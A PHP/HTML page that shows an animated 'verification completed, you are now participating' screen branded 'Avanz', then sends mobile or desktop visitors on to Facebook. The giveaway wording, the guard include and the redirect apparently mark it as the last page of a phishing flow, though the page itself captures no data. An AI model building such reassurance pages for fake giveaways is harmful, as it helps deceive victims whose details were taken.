<?php
require_once __DIR__ . '/_guard.php';
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
    header("Location: index.php");
    exit;
}

// Detectar si es móvil
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$esMovil = preg_match('/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i', $userAgent);
$esAndroid = preg_match('/Android/i', $userAgent);
$esIOS = preg_match('/iPhone|iPad|iPod/i', $userAgent);

// URLs de redirección
if ($esAndroid) {
    $redirect_url = "intent://www.facebook.com/#Intent;scheme=https;package=com.facebook.katana;end";
    $fallback_url = "https://www.facebook.com";
} elseif ($esIOS) {
    $redirect_url = "fb://";
    $fallback_url = "https://www.facebook.com";
} else {
    $redirect_url = "https://www.facebook.com";
    $fallback_url = "https://www.facebook.com";
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avanz - Verificación Completada</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: sans-serif;
            background: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            text-align: center;
            padding: 20px;
        }
        .checkmark-container {
            width: 120px;
            height: 120px;
            margin: 0 auto 30px;
            position: relative;
        }
        .checkmark-circle {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            background: #FF7500;
            position: relative;
            animation: scaleIn 0.5s ease-out forwards;
            transform: scale(0);
        }
        .checkmark {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(45deg);
            width: 30px;
            height: 55px;
            border-bottom: 6px solid #fff;
            border-right: 6px solid #fff;
            opacity: 0;
            animation: checkIn 0.4s ease-out 0.5s forwards;
        }
        .message {
            font-size: 18px;
            color: #333;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 0.8s forwards;
        }
        .submessage {
            font-size: 15px;
            color: #666;
            margin-top: 10px;
            opacity: 0;
            animation: fadeIn 0.5s ease-out 1.2s forwards;
        }
        @keyframes scaleIn {
            0% {
                transform: scale(0);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }
        @keyframes checkIn {
            0% {
                opacity: 0;
                height: 0;
                width: 0;
            }
            50% {
                opacity: 1;
                height: 0;
                width: 30px;
            }
            100% {
                opacity: 1;
                height: 55px;
                width: 30px;
            }
        }
        @keyframes fadeIn {
            0% {
                opacity: 0;
            }
            100% {
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark-container">
            <div class="checkmark-circle">
                <div class="checkmark"></div>
            </div>
        </div>
        <p class="message">Verificación completada</p>
        <p class="submessage">¡Ya estás participando!</p>
    </div>

    <script>
        var esMovil = <?php echo $esMovil ? 'true' : 'false'; ?>;
        var esAndroid = <?php echo $esAndroid ? 'true' : 'false'; ?>;
        var esIOS = <?php echo $esIOS ? 'true' : 'false'; ?>;
        var redirectUrl = "<?php echo $redirect_url; ?>";
        var fallbackUrl = "<?php echo $fallback_url; ?>";

        // Esperar a que termine la animación (2.5 segundos) y redirigir
        setTimeout(function() {
            if (esAndroid) {
                // Intentar abrir la app de Facebook en Android
                window.location.href = redirectUrl;
                // Fallback si no se abre la app
                setTimeout(function() {
                    window.location.href = fallbackUrl;
                }, 1000);
            } else if (esIOS) {
                // Intentar abrir la app de Facebook en iOS
                window.location.href = redirectUrl;
                // Fallback si no se abre la app
                setTimeout(function() {
                    window.location.href = fallbackUrl;
                }, 1000);
            } else {
                // PC - ir directo a Facebook web
                window.location.href = redirectUrl;
            }
        }, 2500);
    </script>
</body>
</html>
